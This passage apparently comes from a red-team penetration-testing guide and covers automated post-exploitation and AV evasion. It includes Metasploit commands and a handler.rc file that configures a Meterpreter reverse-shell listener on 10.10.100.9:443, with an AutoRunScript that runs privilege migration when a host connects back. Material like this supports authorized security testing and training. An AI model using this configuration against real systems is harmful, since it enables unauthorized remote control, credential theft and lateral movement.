    \ not be used in every campaign, but are great for specific scenarios or one-off\
    \ cases.\n\n# Automation\n\nAs heuristic-based endpoint protections get better\
    \ and better, our attacks need to become quicker and quicker. We can generally\
    \ write malware to evade AV and get through the initial detections, but once we\
    \ start making calls like Mimikatz (in memory) or moving laterally to another\
    \ host, we start to set off alarms. To counter this, I always tell Red Teams to\
    \ get caught on the first attempt. Usually, Blue Teams see this as a win with\
    \ a quicker style (or slightly obfuscated) malware, but the real purpose of it\
    \ is to just learn about their environment. This is accomplished by our initial\
    \ payload auto-running multiple reconnaissance scripts on the victim's machine.\
    \ In the next section, we will go over some auto-run scripts that can automate\
    \ some of our attacks.\n\n# Automating Metploit with RC scripts\n\nWith Metploit,\
    \ we can efficiently and effectively run our post-exploitation scripts using:\n\
    \n+   - Search all Post Exploitation Modules in Metploit\n- msfconsole\n- show\
    \ post\n\nFrom the \"post\" results, select all the modules you want to include\
    \ for auto-execution when receiving a Meterpreter Shell. In this case, we are\
    \ adding a privilege migrate post exploitation (http://bit.ly/2vn1wFB) to our\
    \ attack. To configure the Meterpreter Shell so that it runs this payload on the\
    \ initial connection from our compromised host, we need to specify an AutoRunScript\
    \ parameter. Feel free to add as many AutoRunScripts you need to dump information\
    \ about the system/network, move later, and more!\n\nCreating a Handler and AutoRunScript:\n\
    \n+   - Create a handler file\n    - gedit handler.rc\n    - use multi/handler\n\
    \    - set payload windows/meterpreter/reverse_shell\n    - set LHOST 10.10.100.9\n\
    \    - set LPORT 443\n    - set AutoRunScript post/windows/manage/priv_migrate\n\
    \    - set ExitSession false"
